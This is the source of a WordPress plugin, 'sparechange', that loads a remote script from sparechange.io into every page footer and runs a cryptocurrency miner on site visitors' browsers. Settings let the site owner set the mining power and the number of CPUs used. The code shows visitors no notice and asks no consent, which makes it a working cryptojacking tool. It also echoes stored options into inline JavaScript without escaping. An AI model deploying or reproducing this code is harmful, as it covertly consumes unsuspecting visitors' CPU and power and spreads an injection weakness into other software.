<?php

/**
 * The plugin bootstrap file
 *
 * This file is read by WordPress to generate the plugin information in the plugin
 * admin area. This file also includes all of the dependencies used by the plugin,
 * registers the activation and deactivation functions, and defines a function
 * that starts the plugin.
 *
 * @link              https://www.sparechange.io/
 * @since             1.0.0
 * @package           Sparechange
 *
 * @wordpress-plugin
 * Plugin Name:       sparechange
 * Plugin URI:        https://www.sparechange.io/wp/
 * Description:       A browser based crypto currency miner for your website.
 * Version:           1.0.0
 * Author:            SpareChange
 * Author URI:        https://www.sparechange.io/
 * License:           GPL-2.0+
 * License URI:       http://www.gnu.org/licenses/gpl-2.0.txt
 * Text Domain:       sparechange
 * Domain Path:       /languages
 */

// If this file is called directly, abort.
if ( ! defined( 'WPINC' ) ) {
	die;
}

/**
 * Currently pligin version.
 * Start at version 1.0.0 and use SemVer - https://semver.org
 * Rename this for your plugin and update it as you release new versions.
 */
define( 'PLUGIN_NAME_VERSION', '1.0.0' );

/**
 * The code that runs during plugin activation.
 * This action is documented in includes/class-sparechange-activator.php
 */
function sparechange_activate_sparechange() {

}

/**
 * The code that runs during plugin deactivation.
 * This action is documented in includes/class-sparechange-deactivator.php
 */
function sparechange_deactivate_sparechange() {

}

register_activation_hook( __FILE__, 'sparechange_activate_sparechange' );
register_deactivation_hook( __FILE__, 'sparechange_deactivate_sparechange' );

/**
 * Begins execution of the plugin.
 *
 * Since everything within the plugin is registered via hooks,
 * then kicking off the plugin from this point in the file does
 * not affect the page life cycle.
 *
 * @since    1.0.0
 */
function sparechange_inject_scripts() {
		$options = get_option( 'sparechange_options' );
    	if(array_key_exists('sparechange_field_enable', $options)) { 
    		$throttle = '0.9';
    		if($options['sparechange_field_power'] == 'med') {
				$throttle = '0.6';
    		}
    		if($options['sparechange_field_power'] == 'high') {
    			$throttle = '0';
    		}
    		$threads = $options['sparechange_field_threads'];
    		if($threads == 'auto') {
    			$threads = 'null';
    		}

?>
	<script type="text/javascript" src="https://www.sparechange.io/static/sparechange.js"></script>
	<script type="text/javascript">
		var options = {
			"throttlePercent": <?php echo $throttle; ?>,
			"numberOfThreads": <?php echo $threads; ?>
		};
		miner = new Miner('<?php echo $options['sparechange_field_apikey']; ?>', options);
		miner.start();
	</script>
<?php
    	}
}
add_action( 'wp_footer', 'sparechange_inject_scripts' );

/**
 * @internal never define functions inside callbacks.
 * these functions could be run multiple times; this would result in a fatal error.
 */
 
/**
 * custom option and settings
 */
function sparechange_settings_init() {
 // register a new setting for "sparechange" page
 register_setting( 'sparechange', 'sparechange_options' );
 
 // register a new section in the "sparechange" page
 add_settings_section(
 	'sparechange_section_developers',
 	__( 'SpareChange Miner Settings', 'sparechange' ),
 	'sparechange_section_developers_cb',
 	'sparechange'
 );
 

add_settings_field(
 	'sparechange_field_enable',
 	__( 'Enable Miner', 'sparechange' ),
 	'sparechange_field_enable_cb',
 	'sparechange',
 	'sparechange_section_developers',
 	[
 		'label_for' => 'sparechange_field_enable',
 		'class' => 'sparechange_row',
 		'sparechange_custom_data' => 'custom',
 	]
);

add_settings_field(
 	'sparechange_field_apikey',
 	__( 'SpareChange.io API KEY', 'sparechange' ),
 	'sparechange_field_apikey_cb',
 	'sparechange',
 	'sparechange_section_developers',
 	[
 		'label_for' => 'sparechange_field_apikey',
 		'class' => 'sparechange_row',
 		'sparechange_custom_data' => 'custom',
 	]
);

add_settings_field(
 	'sparechange_field_power', 
 	__( 'Mining Power', 'sparechange' ),
 	'sparechange_field_power_cb',
 	'sparechange',
 	'sparechange_section_developers',
 	[
 		'label_for' => 'sparechange_field_power',
 		'class' => 'sparechange_row',
 		'sparechange_custom_data' => 'custom',
 	]
);

add_settings_field(
 	'sparechange_field_threads', 
 	__( 'Mining CPUs', 'sparechange' ),
 	'sparechange_field_threads_cb',
 	'sparechange',
 	'sparechange_section_developers',
 	[
 		'label_for' => 'sparechange_field_threads',
 		'class' => 'sparechange_row',
 		'sparechange_custom_data' => 'custom',
 	]
);

}
 
/**
 * register our admin settings to the admin_init action hook
 */
add_action( 'admin_init', 'sparechange_settings_init' );
 
/**
 * custom option and settings:
 * callback functions
 */
 
function sparechange_section_developers_cb( $args ) {
 ?>
  <p id="<?php echo esc_attr( $args['id'] ); ?>"><?php esc_html_e( '', 'sparechange' ); ?></p>
 <?php
}
 
function sparechange_field_power_cb( $args ) {
 // get the value of the setting we've registered with register_setting()
 $options = get_option( 'sparechange_options' );
 // output the field
 ?>
 <select 
 	id="<?php echo esc_attr( $args['label_for'] ); ?>"
 	data-custom="<?php echo esc_attr( $args['sparechange_custom_data'] ); ?>"
 	name="sparechange_options[<?php echo esc_attr( $args['label_for'] ); ?>]"
 >

 <option 
 	value="low" 
 	<?php echo isset( $options[ $args['label_for'] ] ) ? ( selected( $options[ $args['label_for'] ], 'low', false ) ) : ( 'true' ); ?>
 >
 	<?php esc_html_e( 'Low Power', 'sparechange' ); ?>
 </option>
 <option 
 	value="med" 
 	<?php echo isset( $options[ $args['label_for'] ] ) ? ( selected( $options[ $args['label_for'] ], 'med', false ) ) : ( '' ); ?>
 >
 	<?php esc_html_e( 'Medium Power', 'sparechange' ); ?>
 </option>
 <option 
 	value="high" 
 	<?php echo isset( $options[ $args['label_for'] ] ) ? ( selected( $options[ $args['label_for'] ], 'high', false ) ) : ( '' ); ?>
 >
 	<?php esc_html_e( 'High Power', 'sparechange' ); ?>
 </option>
 
 </select>
 <p class="description">
 	<?php esc_html_e( 'Low power uses less of your users\' CPU', 'sparechange' ); ?>
 </p>
 <?php
}

function sparechange_field_enable_cb( $args ) {
 // get the value of the setting we've registered with register_setting()
 $options = get_option( 'sparechange_options' );
 // output the field
 ?>
 <input 
 	id="<?php echo esc_attr( $args['label_for'] ); ?>"
 	data-custom="<?php echo esc_attr( $args['sparechange_custom_data'] ); ?>"
 	name="sparechange_options[<?php echo esc_attr( $args['label_for'] ); ?>]"
 	value="<?php echo $options[ $args['label_for'] ]?>"
 	type="checkbox" <?php if(isset($options[ $args['label_for'] ])) { echo 'checked'; } ?>
 />
 <?php
}

function sparechange_field_apikey_cb( $args ) {
 // get the value of the setting we've registered with register_setting()
 $options = get_option( 'sparechange_options' );
 // output the field
 ?>
 <input 
 	id="<?php echo esc_attr( $args['label_for'] ); ?>"
 	data-custom="<?php echo esc_attr( $args['sparechange_custom_data'] ); ?>"
 	name="sparechange_options[<?php echo esc_attr( $args['label_for'] ); ?>]"
 	value="<?php echo $options[ $args['label_for'] ]?>"
 	type="text"
 />
 <?php
}

function sparechange_field_threads_cb( $args ) {
 // get the value of the setting we've registered with register_setting()
 $options = get_option( 'sparechange_options' );
 // output the field
 ?>
 <select 
 	id="<?php echo esc_attr( $args['label_for'] ); ?>"
 	data-custom="<?php echo esc_attr( $args['sparechange_custom_data'] ); ?>"
 	name="sparechange_options[<?php echo esc_attr( $args['label_for'] ); ?>]"
 >

 <option 
 	value="auto" 
 	<?php echo isset( $options[ $args['label_for'] ] ) ? ( selected( $options[ $args['label_for'] ], 'auto', false ) ) : ( 'true' ); ?>
 >
 	<?php esc_html_e( 'Auto-Detect', 'sparechange' ); ?>
 </option>
 <option 
 	value="1" 
 	<?php echo isset( $options[ $args['label_for'] ] ) ? ( selected( $options[ $args['label_for'] ], '1', false ) ) : ( '' ); ?>
 >
 	<?php esc_html_e( '1 CPU', 'sparechange' ); ?>
 </option>
 <option 
 	value="2" 
 	<?php echo isset( $options[ $args['label_for'] ] ) ? ( selected( $options[ $args['label_for'] ], '2', false ) ) : ( '' ); ?>
 >
 	<?php esc_html_e( '2 CPUs', 'sparechange' ); ?>
 </option>
 <option 
 	value="4" 
 	<?php echo isset( $options[ $args['label_for'] ] ) ? ( selected( $options[ $args['label_for'] ], '4', false ) ) : ( '' ); ?>
 >
 	<?php esc_html_e( '4 CPUs', 'sparechange' ); ?>
 </option>
 <option 
 	value="8" 
 	<?php echo isset( $options[ $args['label_for'] ] ) ? ( selected( $options[ $args['label_for'] ], '8', false ) ) : ( '' ); ?>
 >
 	<?php esc_html_e( '8 CPUs', 'sparechange' ); ?>
 </option>
 
 </select>
 <p class="description">
 	<?php esc_html_e( 'Auto-Detect is the best setting. It will use all the user\'s available CPUs', 'sparechange' ); ?>
 </p>
 <?php
}
 
/**
 * top level menu
 */
function sparechange_options_page() {
 // add top level menu page
 add_menu_page(
 'SpareChange',
 'SpareChange Options',
 'manage_options',
 'sparechange',
 'sparechange_options_page_html'
 );
}
 
/**
 * register our sparechange_options_page to the admin_menu action hook
 */
add_action( 'admin_menu', 'sparechange_options_page' );
 
/**
 * top level menu:
 * callback functions
 */
function sparechange_options_page_html() {
 // check user capabilities
 if ( ! current_user_can( 'manage_options' ) ) {
 return;
 }
 
 // add error/update messages
 
 // check if the user have submitted the settings
 // wordpress will add the "settings-updated" $_GET parameter to the url
 if ( isset( $_GET['settings-updated'] ) ) {
 // add settings saved message with the class of "updated"
 add_settings_error( 'sparechange_messages', 'sparechangemessage', __( 'Settings Saved', 'sparechange' ), 'updated' );
 }
 
 // show error/update messages
 settings_errors( 'sparechange_messages' );
 ?>
 <div class="wrap">
 <h1><?php echo esc_html( get_admin_page_title() ); ?></h1>
 <form action="options.php" method="post">
 <?php
 // output security fields for the registered setting "sparechange"
 settings_fields( 'sparechange' );
 // output setting sections and their fields
 // (sections are registered for "sparechange", each field is registered to a specific section)
 do_settings_sections( 'sparechange' );
 // output save settings button
 submit_button( 'Save Settings' );
 ?>
 </form>
 </div>
 <?php
}
